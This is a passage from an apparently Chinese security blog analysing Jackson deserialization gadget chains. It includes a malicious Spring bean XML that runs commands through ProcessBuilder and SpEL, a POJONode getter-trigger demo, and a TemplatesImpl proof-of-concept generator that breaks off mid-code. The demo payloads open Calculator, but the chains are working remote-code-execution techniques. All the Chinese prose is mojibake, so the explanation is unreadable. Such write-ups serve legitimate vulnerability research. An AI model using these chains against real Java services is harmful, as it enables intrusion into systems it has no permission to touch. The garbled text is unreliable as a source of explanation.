class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/zsh<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="è°ƒè¯•åˆ†æ-2"><a href="#è°ƒè¯•åˆ†æ-2" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h4><p>å…ˆæ–­åˆ°å¼€å§‹ååºåˆ—åŒ–çš„è¿™ä¸€æ­¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735028927220-957cd78d-5cf2-470d-a22c-3043c19e8d49.png"></p><p>è·Ÿè¿›è¿™æ¬¡ä¼šèµ°åˆ°TypeWrappedDeserializer.classçš„deserializeæ–¹æ³•é‡Œå»è€Œä¸æ˜¯ä¹‹å‰çš„BeanDeserializerç±»çš„deserializeæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735028890730-186d84ba-4695-4be5-868c-319667c242c7.png"></p><p>é‚£æˆ‘ä»¬ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029164036-fc4dc1e5-8eaa-426d-b233-4fa586cd0123.png"></p><p>ä¼šèµ°åˆ°è¿™ä¸ªcaseé‡Œå»ç»§ç»­è·Ÿè¿›å»<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029311314-333edf39-0165-4a8c-aab6-caa3c1dce591.png"></p><p>ç»§ç»­è°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029458294-b5bf3db9-e0af-46cb-bb8c-9205091bc56f.png"></p><p>è¿™é‡Œä¼šè·å–beançš„ååºåˆ—åŒ–å™¨è°ƒç”¨ä»–çš„ååºåˆ—åŒ–æ–¹æ³•è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029499147-afd452de-a149-479c-8d1e-665b1421d42c.png"></p><p>ç»§ç»­èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029516508-c7dc5114-9f2a-4514-91f6-c041e2a1fe64.png"></p><p>ä¼šè¿›å…¥è¿™ä¸ªcaseè·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029542681-f7c9a017-fb9f-4dbe-835f-e2d29e3d1247.png"></p><p>çœ‹çœ‹è¿™ä¸ªcreateFromStringæ–¹æ³•æ˜¯å¹²å˜›çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029612228-c1fee04d-dc6b-41f8-b63b-b1051685deb0.png"></p><p>è¿™é‡Œä¼šå»è¯·æ±‚æˆ‘ä»¬åœ¨webä¸Šçš„æ¶æ„xmlæ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029642767-014420c0-5baa-4a33-83a1-68dbb7ba199c.png"></p><p>è·Ÿè¿›æ¥å‘ç°ä¼šå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029747487-953bfa49-9bf7-4fcd-a89f-c6516e750f78.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029764403-8fee56ee-a6bf-44ff-b4b4-8417e3e9d2e5.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨refreshæ–¹æ³•</p><p>:::tips<br>å‰é¢è°ƒç”¨newInstance()æ˜¯æ–°å»ºæˆ‘ä»¬çš„åˆ©ç”¨ç±»org.springframework.context.support.ClassPathXmlApplicationContextçš„å®ä¾‹ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°å¹¶æ²¡æœ‰è°ƒç”¨ClassPathXmlApplicationContextç±»ç›¸å…³çš„setteræ–¹æ³•ï¼Œè¿™æ˜¯å› ä¸ºè¯¥ç±»æœ¬èº«å°±æ²¡æœ‰setteræ–¹æ³•ï¼Œä½†æ˜¯æ‹¥æœ‰æ„é€ å‡½æ•°ï¼Œå› æ­¤Jacksonååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ClassPathXmlApplicationContextç±»çš„æ„é€ å‡½æ•°ã€‚è€Œè¿™ä¸ªç‚¹å°±æ˜¯å’Œä¹‹å‰çš„åˆ©ç”¨é“¾çš„ä¸åŒä¹‹å¤„ï¼Œè¯¥ç±»çš„æ¼æ´ç‚¹å‡ºåœ¨è‡ªå·±çš„æ„é€ å‡½æ•°è€Œéåœ¨setteræ–¹æ³•ä¸­ã€‚</p><p>:::</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029929360-6a3d75a9-6b3f-4ab0-b5bf-f7bb08352fd5.png"></p><p>å…³é”®ç‚¹ä¼šè°ƒç”¨invokeBeanFactoryPostProcessorsæ–¹æ³•è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030129561-d19c5699-38ba-415d-93c6-d4c8d83ed89b.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030163809-7cb8b33e-95a7-4813-a918-350d91c38fed.png"></p><p>ä¼šè°ƒç”¨getBeanNamesForTypeæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030229101-d584f5ac-45c4-4821-b8b2-d151bc4ab718.png"></p><p>ä¼šè¿”å›doGetBeanNamesForTypeæ–¹æ³•çš„å€¼</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030363424-36387c5c-0a82-4b4a-80de-4eafbe76c33d.png"></p><p>è·Ÿè¿›isFactoryBeanæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031282033-07d2df2c-cd93-4c9a-a647-102f28e9108f.png"></p><p>ç»§ç»­è·Ÿåˆ°predictBeanTypeé‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031328546-c17f6515-4775-4017-a404-02f5164ea5dc.png"></p><p>ç»§ç»­åˆ°determineTargeté‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031377193-af573c1b-cc27-44d4-bf53-86957cd2363e.png"></p><p>è¿™é‡ŒtargetTypeæ˜¯nullæ‰€ä»¥ä¼šè¿›å…¥resolveClassæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031439221-1dd5eef9-7239-485a-8f29-dcd786fc6b5e.png"></p><p>è·Ÿåˆ°doResolveBeanClassæ–¹æ³•é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031479350-8de4b305-c652-4cd7-90e0-44744707bb1c.png"></p><p>è·Ÿè¿›evaluateBeanDefinitionStringæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031526775-7c540edf-e1ab-4685-8478-4bf91e91c71f.png"></p><p>è·Ÿåˆ°beanExpressionResolver.evaluate</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031731355-50251697-d710-4429-b58d-c1bdd8b28b8d.png">è¿™é‡Œä¼šè·processBuilderå¯¹è±¡ç»§ç»­å‘ä¸‹èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031786214-3f981ef5-6f07-400e-a167-d74b0c1c17d2.png"></p><p>è°ƒç”¨äº†Expression.getValue()æ–¹æ³•å³SpELè¡¨è¾¾å¼æ‰§è¡Œçš„æ–¹æ³• secå‚æ•°æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å†…å®¹å³ç”±spel.xmlè§£æå¾—åˆ°çš„SpELè¡¨è¾¾å¼</p><p>org.springframework.context.support.ClassPathXmlApplicationContextç±»ï¼Œå®ƒçš„æ„é€ å‡½æ•°å­˜åœ¨SpELæ³¨å…¥æ¼æ´ï¼Œè¿›è€Œå¯¼è‡´å¯è¢«åˆ©ç”¨æ¥è§¦å‘Jacksonååºåˆ—åŒ–æ¼æ´ã€‚</p><h3 id="é€šç”¨é“¾"><a href="#é€šç”¨é“¾" class="headerlink" title="é€šç”¨é“¾"></a>é€šç”¨é“¾</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><p>åˆ©ç”¨çš„æ˜¯Jacksonä¸­çš„PojoNode ä»–çš„toStringæ˜¯å¯ä»¥ç›´æ¥è§¦å‘ä»»æ„çš„getterçš„ è§¦å‘æ¡ä»¶å¦‚ä¸‹</p><ul><li>ä¸éœ€è¦å­˜åœ¨è¯¥å±æ€§</li><li>getteræ–¹æ³•éœ€è¦æœ‰è¿”å›å€¼</li><li>å°½å¯èƒ½çš„åªæœ‰ä¸€ä¸ªgetter</li></ul><p>å†™ä¸€ä¸ªdemoæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_tongsha</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line">        jsonNodes.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨ã€‚ä¸‹é¢æ¥åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆ</p><h4 id="è°ƒè¯•åˆ†æ-3"><a href="#è°ƒè¯•åˆ†æ-3" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043243159-2a8f68cb-f15e-4146-9123-34f4587c4a8c.png"></p><p>è·Ÿåˆ°toStringæ–¹æ³•é‡Œä¼šè°ƒç”¨InternalNodeMapper.nodeToStringç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043304314-86e2b935-92d3-4b88-a212-e60489f5606e.png"></p><p>è·Ÿåˆ°writeValueAsStringæ–¹æ³•é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043359476-02fb17aa-fd37-49e3-bbe6-0a7b7f2b9123.png">ç»§ç»­è·Ÿåˆ°_writeValueAndCloseæ–¹æ³•ä¸­<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043397712-80b52a32-680d-4573-82f9-594f5d2c58c1.png"></p><p>ç»§ç»­è·Ÿåˆ°serializeæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043431879-227abbb7-02fb-45a5-90dc-68b26f9a5d4d.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043478187-0467152d-cbde-478c-b3a4-b084b10032cc.png"></p><p>è¿™é‡Œä¼šè·å–å¯¹åº”çš„åºåˆ—åŒ–å™¨ç„¶åä¼ å…¥åºåˆ—åŒ–æ–¹æ³•è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043516182-f81bdda2-7d0d-40f9-a259-c65760f39d23.png"></p><p>ç»§ç»­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043529164-083ca697-c6ff-4f6b-adfa-8ed06e42415c.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043544236-94219a5d-5ac5-41f8-b3e6-59713653f82e.png"></p><p>è·Ÿè¿›defaultSerializeValueæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043683815-b28b5a5b-389a-4c6f-a62b-693be1308a1a.png"></p><p>ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043770342-135b8137-4802-4834-a7ed-3bdf8a123cba.png"></p><p>è¿™é‡ŒwriteStartObjectä¼šå†™å…¥{ writeEndObjectå†™å…¥}ä¹‹åä¸­é—´æ˜¯å¯¹Beanå¯¹è±¡çš„å±æ€§å€¼çš„ä¸€äº›æ„é€ </p><p>è¿™é‡Œè·Ÿåˆ°serializeFieldsæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043852306-75526ba6-062b-46f0-8875-459f85c16f41.png"></p><p>ä¸»è¦æ˜¯å¯¹Beanç±»ä¸­çš„æ‰€æœ‰å±æ€§å€¼çš„å†™å…¥è·Ÿåˆ°serializeAsFieldæ–¹æ³•ä¸­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043900669-a995e299-15a8-49ac-b43b-c631c3e6ff70.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043908833-c921e05a-9bdb-4d88-b7a0-6b43247a7fd2.png"></p><p>è¿™é‡Œä¼šåå°„è°ƒç”¨getteræ–¹æ³•ï¼Œå…¶å®å’Œfastjsonåºåˆ—åŒ–è°ƒç”¨getteræ–¹æ³•å·®ä¸å¤šè‡ªå·±è·Ÿè·Ÿå°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getName:<span class="number">10</span>, User (com.ocean)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line">main:<span class="number">12</span>, jackson_tongsha (com.ocean)</span><br></pre></td></tr></table></figure><p>9### templatesé“¾åˆ©ç”¨<br>ç›´æ¥ç»™poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_tongsha</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> 